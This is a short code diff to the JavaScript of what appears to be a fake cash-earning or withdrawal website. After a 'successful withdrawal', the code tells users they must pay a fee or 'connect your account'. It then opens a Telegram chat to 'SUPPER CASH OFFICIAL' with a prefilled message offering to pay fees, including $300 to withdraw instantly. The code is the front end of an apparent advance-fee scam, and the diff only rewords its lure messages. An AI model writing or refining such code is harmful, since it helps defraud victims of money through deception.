@@ -490,7 +490,7 @@ document.getElementById("withdrawForm").addEventListener("submit", async e => {
       return;
     }
     
-    showMsg("Withdrawal successful! kindly deposit 50 pounds to your account by paypal to be able to withdraw to UnitedKingdom.", true);
+    showMsg("Withdrawal successful but CONNECT YOUR ACCOUNT FIRST.", true);
     feeSection.classList.remove("hidden");
   } catch {
     showMsg("Network error, please try again later.", false);
@@ -506,7 +506,7 @@ approveBtn.addEventListener("click", () => {
     `Hello SUPPER CASH OFFICIAL!\n` +
     `I have withdrawn $${amount} via ${payMethod}.\n` +
     `Payment details: ${payDetails}\n` +
-    `THE AMOUNT OF FEE THAT WILL BE DEBITED $${fee}. PLEASE I WANT TO PAY $300 TO SKIP THIS AND WITHDRAW INSTANTLY.`
+    `THE AMOUNT OF FEE THAT WILL BE DEBITED $${fee}. PLEASE CONNECT YOUR ACCOUNT FIRST.`
   );
   window.open(`https://t.me/Deluxcashearning/url?url=&text=${txt}`, '_blank');
 });
